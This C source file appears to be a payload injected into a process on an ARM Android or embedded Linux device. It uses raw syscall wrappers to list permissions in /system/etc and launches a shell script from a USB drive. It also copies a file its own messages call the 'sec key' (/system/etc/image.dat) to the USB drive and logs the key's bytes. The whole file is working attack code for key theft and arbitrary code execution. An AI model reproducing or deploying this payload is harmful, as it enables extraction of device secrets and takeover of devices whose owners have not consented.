#define O_RDONLY 0x0000
#define O_WRONLY 0x0001
#define O_CREAT 0x0040
#define EOF -1
#define R_OK 4
#define	X_OK 1
#define MAX_FILENAME 256
#define BUFF_SIZE 4098
#define NULL 0x0

typedef unsigned int mode_t;
typedef int off_t;

typedef struct dirent {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
} dirent;

struct stat {
#if defined(__ARMEB__)
	unsigned short st_dev;
	unsigned short __pad1;
#else
	unsigned long  st_dev;
#endif
	unsigned long  st_ino;
	unsigned short st_mode;
	unsigned short st_nlink;
	unsigned short st_uid;
	unsigned short st_gid;
#if defined(__ARMEB__)
	unsigned short st_rdev;
	unsigned short __pad2;
#else
	unsigned long  st_rdev;
#endif
	unsigned long  st_size;
	unsigned long  st_blksize;
	unsigned long  st_blocks;
	unsigned long  st_atime;
	unsigned long  st_atime_nsec;
	unsigned long  st_mtime;
	unsigned long  st_mtime_nsec;
	unsigned long  st_ctime;
	unsigned long  st_ctime_nsec;
	unsigned long  __unused4;
	unsigned long  __unused5;
};

static int write(int fd, const char* buf, unsigned int len) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register const char* _buf asm("r1") = buf;
    register unsigned int _len asm("r2") = len;
    register int sys_write asm("r7") = 4;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_buf), "r"(_len), "r"(sys_write)
                 :);
    return ret;
}

static int exit(int code) {
    register int ret asm("r0");
    register int _code asm("r0") = code;
    register int sys_exit asm("r7") = 1;
    asm volatile("svc #0" : "=r"(ret) : "r"(_code), "r"(sys_exit) :);
    return ret;
}
                               
static int fork(void) {
	register int ret asm("r0");
	register int sys_fork asm("r7") = 2;
	asm volatile("svc #0" : "=r"(ret) : "r"(sys_fork) :);
	return ret;
}

static int execve(const char *filename, char *const argv[], char *const envp[]) {
	register int ret asm("r0");
	register const char *_filename asm("r0") = filename;
	register char *const *_argv asm("r1") = argv;
	register char *const *_envp asm("r2") = envp;
	register int sys_execve asm("r7") = 11;
	asm volatile("svc #0"
				 : "=r"(ret)
				 : "r"(_filename), "r"(_argv), "r"(_envp), "r"(sys_execve)
				 :);
	return ret;
}

static int read(int fd, const char* buf, unsigned int len) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register const char* _buf asm("r1") = buf;
    register unsigned int _len asm("r2") = len;
    register int sys_read asm("r7") = 3;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_buf), "r"(_len), "r"(sys_read)
                 :);
    return ret;
}

static int open(const char* path, int flags, mode_t mode) {
    register int ret asm("r0");
    register const char* _path asm("r0") = path;
    register int _flags asm("r1") = flags;
    register mode_t _mode asm("r2") = mode;
    register int sys_open asm("r7") = 5;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_path), "r"(_flags), "r"(_mode), "r"(sys_open)
                 :);
    return ret;
}

static int close(int fd) {
    register int ret asm("r0");
    register int _fd asm("r0") = fd;
    register int sys_read asm("r7") = 6;
    asm volatile("svc #0" : "=r"(ret) : "r"(_fd), "r"(sys_read) :);
    return ret;
}

static int getdents(unsigned int fd, struct dirent* dirp, unsigned int count) {
    register int ret asm("r0");
    register unsigned int _fd asm("r0") = fd;
    register struct dirent* _dirp asm("r1") = dirp;
    register unsigned int _count asm("r2") = count;
    register int sys_getdents asm("r7") = 141;  // getdents syscall number
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_fd), "r"(_dirp), "r"(_count), "r"(sys_getdents)
                 :);
    return ret;
}

static int access(const char* path, int mode) {
    register int ret asm("r0");
    register const char* _path asm("r0") = path;
    register int _mode asm("r1") = mode;
    register int sys_access asm("r7") = 33;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_path), "r"(_mode), "r"(sys_access)
                 :);
    return ret;
}

static int stat(const char *pathname, struct stat *statbuf) {
    register int ret asm("r0");
    register const char *_path asm("r0") = pathname;
    register struct stat *_statbuf asm("r1") = statbuf;
    register int sys_stat asm("r7") = 106;
    asm volatile("svc #0"
                 : "=r"(ret)
                 : "r"(_path), "r"(_statbuf), "r"(sys_stat)
                 :);
    return ret;
}

static int strlen(const char *str) {
    const char *s;

    for (s = str; *s; ++s)
        ;
    return s - str;
}

static int getuid(void) {
    register int ret asm("r0");
    register int sys_getuid asm("r7") = 24;
    asm volatile("svc #0" : "=r"(ret) : "r"(sys_getuid) :);
    return ret;
}

static int getgid(void) {
    register int ret asm("r0");
    register int sys_getgid asm("r7") = 47;
    asm volatile("svc #0" : "=r"(ret) : "r"(sys_getgid) :);
    return ret;
}


static void strrev(char *str)
{
	int i;
	int j;
	unsigned char a;
	unsigned len = strlen((const char *)str);
	for (i = 0, j = len - 1; i < j; i++, j--)
	{
		a = str[i];
		str[i] = str[j];
		str[j] = a;
	}
}

static int itoa(int num, char* str, int len, int base)
{
	int sum = num;
	int i = 0;
	int digit;
	if (len == 0)
		return -1;
	do
	{
		digit = sum % base;
		if (digit < 0xA)
			str[i++] = '0' + digit;
		else
			str[i++] = 'A' + digit - 0xA;
		sum /= base;
	}while (sum && (i < (len - 1)));
	if (i == (len - 1) && sum)
		return -1;
	str[i] = '\0';
	strrev(str);
	return 0;
}

static int fgetc(int fd) {
    char c;
    if (read(fd, &c, 1) == 1) {
        return c;
    } else {
        return EOF;
    }
}

static int fputc(char c, int fd) {
    if (write(fd, &c, 1) == 1) {
        return c;
    } else {
        return EOF;
    }
}

// This function will call stat on the path and print Size, Owner GID and UID, and Mode
static void get_stat(char* path, int log_fp) {
	//@textify
	char size_str[] = "Size: ";
	//@textify
	char uid_str[] = "UID: ";
	//@textify
	char gid_str[] = "GID: ";
	//@textify
	char mode_str[] = "Mode: ";
	//@textify
	char newline[] = "\n";
	//@textify
	char error[] = "Error getting stat\n";
	struct stat sb;
	char buffer[33] = {0};

	if (stat(path, &sb) == -1) {
		write(log_fp, error, sizeof(error)-1);
		return;
	}

	// Size
	itoa(sb.st_size, buffer, sizeof(buffer), 10);
	write(log_fp, size_str, sizeof(size_str)-1);
	write(log_fp, buffer, strlen(buffer));
	write(log_fp, newline, sizeof(newline)-1);

	// GID
	itoa(sb.st_gid, buffer, sizeof(buffer), 10);
	write(log_fp, gid_str, sizeof(gid_str)-1);
	write(log_fp, buffer, strlen(buffer));
	write(log_fp, newline, sizeof(newline)-1);

	// UID
	itoa(sb.st_uid, buffer, sizeof(buffer), 10);
	write(log_fp, uid_str, sizeof(uid_str)-1);
	write(log_fp, buffer, strlen(buffer));
	write(log_fp, newline, sizeof(newline)-1);

	// Mode
	itoa(sb.st_mode, buffer, sizeof(buffer), 8);
	write(log_fp, mode_str, sizeof(mode_str)-1);
	write(log_fp, buffer, strlen(buffer));
	write(log_fp, newline, sizeof(newline)-1);
}

void hooked_func() {
    int src_fp, dst_fp, len, err, nread, sanity_fp, log_fp, idx;
    struct dirent* d;
    char buffer[BUFF_SIZE];
    char d_buffer[BUFF_SIZE];
	char uid_str[10];
	char gid_str[10];


    // Paths
    //@textify
    char src_path[] = "/system/etc/image.dat";
    //@textify
    char dst_path[] = "/storage/usb0/imaged.dat";
    //@textify
    char etc_path[] = "/system/etc";
    //@textify
    char log_filename[] = "/storage/usb0/XXlog.txt";
    //@textify
    char sanity_filename[] = "/storage/usb0/sanity.txt";
    //@textify
    char script_path[] = "/storage/usb0/run.sh";
	//@textify
	char sh_path[] = "/system/bin/sh";

    // Error messages
    //@textify
    char error_source[] = "E: source sec key open\n";
    //@textify
    char error_dest[] = "E: dest sec key open\n";
    //@textify
    char error_read[] = "E: reading sec key file\n";
    //@textify
    char error_write[] = "E: writing sec key file\n";
    //@textify
    char error_dir_read[] = "E: reading dir\n";
    //@textify
    char error_dir_open[] = "E: open dir\n";

    // Other
    //@textify
    char copy_success[] = "Copy sec key success\n";
    //@textify
    char sanity_value[] = "Hello!\n";
    //@textify
    char str_d_name[] = "d_name: ";
    //@textify
    char is_readable[] = " is readable\n";
    //@textify
    char is_executable[] = " is executable\n";
    //@textify
    char is_not_readable[] = " is not readable\n";
    //@textify
    char is_not_executable[] = " is not executable\n";
    //@textify
    char str_start_copy[] = "Start copy========\n";
    //@textify
    char str_end_copy[] = "\nEnd copy==========\n";
    //@textify
    char str_end[] = "End ========= \n";
    //@textify
    char space[] = "  ";
    //@textify
    char sanity_failed[] = "Sanity check failed\n";
	//@textify
	char size[] = "\nSize: ";
	//@textify
	char owner_uid[] = "\nOwner UID: ";
	//@textify
	char owner_gid[] = "\nOwner GID: ";
	//@textify
	char mode[] = "\nFile mode: ";
	//@textify 
	char current[] = "\nCurrent UID, GID: ";
	//@textify
	char run_sh[] = "Going to launch usb0/run.sh\n";
	//@textify
	char sh[] = "sh";


    // check if we can write anything to a file on the USB
    sanity_fp = open(sanity_filename, O_WRONLY | O_CREAT, 0777);
    if (sanity_fp > 0) {
        write(sanity_fp, sanity_value, sizeof(sanity_value) - 1);
    } else {
        char error_str[128] = {0};
        itoa(sanity_fp, error_str, sizeof(error_str), 10 );
        write(1, error_str, sizeof(error_str) - 1);
        write(1, space, 2);
        write(1, sanity_failed, 21);
        close(sanity_fp);
        return;
    }
    close(sanity_fp);

    log_fp = open(log_filename, O_WRONLY | O_CREAT, 0777);
    if (log_fp < 0) {
        char error_str[128] = {0};
		itoa(log_fp, error_str, sizeof(error_str), 10);
        write(1, error_str, sizeof(error_str) - 1);
        write(1, space, 2);
        write(1, sanity_failed, 21);
        goto LOG_END;
    }
    write(log_fp, sanity_value, sizeof(sanity_value) - 1);

    // print directory permissions
    int dir_fd = open(etc_path, O_RDONLY, 0);
    if (dir_fd < 0) {
        char error_str[128] = {0};
		itoa(dir_fd, error_str, sizeof(error_str), 10);
        write(log_fp, error_str, sizeof(error_str) - 1);
        write(log_fp, space, 2);
        write(log_fp, error_dir_open, sizeof(error_dir_open) - 1);
        goto LOG_END;
    }

    while (1) {
        nread = getdents(dir_fd, (struct dirent*)d_buffer, BUFF_SIZE);
        if (nread < 0) {
            char error_str[128] = {0};
			itoa(nread, error_str, sizeof(error_str), 10);
            write(log_fp, error_str, sizeof(error_str) - 1);
            write(log_fp, space, 2);
            write(log_fp, error_dir_read, sizeof(error_dir_read) - 1);
            goto LOG_END;
        }
        if (nread == 0) {  // end of directory
            break;
        }

        for (int bpos = 0; bpos < nread;) {
            d = (struct dirent*)(d_buffer + bpos);
            char f_path[MAX_FILENAME];

            idx = 0;
            for (int i = 0; i < 12; i++) {
                f_path[idx++] = etc_path[i];
            }
            f_path[idx++] = '/';

            int name_len = 0;
            while (name_len < MAX_FILENAME && d->d_name[name_len]) {
                name_len++;
            }
            for (int i = 0; i < name_len; i++) {
                f_path[idx++] = d->d_name[i];
            }

            write(log_fp, str_d_name, sizeof(str_d_name) - 1);
            write(log_fp, d->d_name, name_len);
            if (access(d->d_name, R_OK) == 0) {
                write(log_fp, is_readable, sizeof(is_readable) - 1);
            } else {
                write(log_fp, is_not_readable, sizeof(is_not_readable) - 1);
            }
			// check if exectuable 
			if (access(d->d_name, X_OK) == 0) {
				write(log_fp, is_executable, sizeof(is_executable) - 1);
			} else {
				write(log_fp, is_not_executable, sizeof(is_not_executable) - 1);
			}

            bpos += d->d_reclen;
        }
    }

    close(dir_fd);

	// Fork and execute run.sh
	write(log_fp, run_sh, sizeof(run_sh) - 1);
	int pid = fork();
	if (pid == 0){
    	char* argv[] = {sh, script_path, NULL};
		execve(sh_path, argv, NULL);
	} else {
		// print current uid and gid
		write(log_fp, current, sizeof(current) - 1);
		itoa(getuid(), uid_str, sizeof(uid_str), 10);
		write(log_fp, uid_str, sizeof(uid_str) - 1);
		write(log_fp, space, 2);
		itoa(getgid(), gid_str, sizeof(gid_str), 10);
		write(log_fp, gid_str, sizeof(gid_str) - 1);
		write(log_fp, space, 2);


		get_stat(src_path, log_fp);

		get_stat(etc_path, log_fp);


		src_fp = open(src_path, O_RDONLY, 0);
		if (src_fp < 0) {
			char error_str[128] = {0};
			itoa(src_fp, error_str, sizeof(error_str), 10);
			write(log_fp, error_str, sizeof(error_str) - 1);
			write(log_fp, space, 2);
			write(log_fp, error_source, sizeof(error_source) - 1);
			goto SRC_END;
		}

		dst_fp = open(dst_path, O_WRONLY | O_CREAT, 0777);
		if (dst_fp < 0) {
			char error_str[128] = {0};
			itoa(dst_fp, error_str, sizeof(error_str), 10);
			write(log_fp, error_str, sizeof(error_str) - 1);
			write(log_fp, space, 2);
			write(log_fp, error_dest, sizeof(error_dest) - 1);
			goto END;
		}

		int c = 0;
		write(log_fp, str_start_copy, sizeof(str_start_copy) - 1);
		while ((c = fgetc(src_fp)) != EOF) {
			fputc(c, dst_fp);
			write(log_fp, space, sizeof(space) - 1);
			write(log_fp, (char*)&c, 1);
		}
		write(log_fp, str_end_copy, sizeof(str_end_copy) - 1);

		write(log_fp, copy_success, sizeof(copy_success) - 1);

END:
    close(dst_fp);
SRC_END:
    close(src_fp);
LOG_END:
    write(log_fp, str_end, sizeof(str_end) - 1);
    close(log_fp);

	}
    return;
}
